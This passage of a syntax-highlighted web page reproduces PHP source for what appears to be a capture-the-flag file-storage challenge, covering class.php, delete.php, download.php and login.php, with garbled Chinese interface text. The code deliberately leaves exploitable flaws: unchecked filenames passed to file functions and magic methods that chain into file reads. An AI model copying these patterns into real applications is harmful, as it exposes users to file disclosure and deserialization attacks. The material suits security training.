punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">涓嬭浇&lt;/a> / &lt;a href="#" class="delete">鍒犻櫎&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' B'</span><span class="token punctuation">,</span> <span class="token string">' KB'</span><span class="token punctuation">,</span> <span class="token string">' MB'</span><span class="token punctuation">,</span> <span class="token string">' GB'</span><span class="token punctuation">,</span> <span class="token string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//delete.php</span><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//download.php</span><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//login.php</span><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token doctype">&lt;!doctype html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1, shrink-to-fit<span class="token punctuation">=</span>no<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>鐧诲綍<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Bootstrap core CSS --></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>    <span class="token punctuation">.</span>bd<span class="token operator">-</span>placeholder<span class="token operator">-</span>img <span class="token punctuation">{</span>      font<span class="token operator">-</span>size<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">.</span>125rem<span class="token punctuation">;</span>      text<span class="token operator">-</span>anchor<span class="token punctuation">:</span> middle<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token function">media</span> <span class="token punctuation">(</span>min<span class="token operator">-</span>width<span class="token punctuation">:</span> 768px<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">.</span>bd<span class="token operator">-</span>placeholder<span class="token operator">-</span>img<span class="token operator">-</span>lg <span class="token punctuation">{</span>        font<span class="token operator">-</span>size<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">.</span>5rem<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Custom styles for this template --></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/css/std.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-signin<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>h3 mb-3 font-weight-normal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>鐧诲綍<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Username<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Password<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-lg btn-primary btn-block<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>鎻愪氦<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mt-5 text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>杩樻病鏈夎处鍙�<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>register.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>娉ㄥ唽<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>copy<span class="token punctuation">;</span> <span class="token number">2018</span><span class="token operator">-</span><span class="token number">2019</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>toast-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/toast.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token 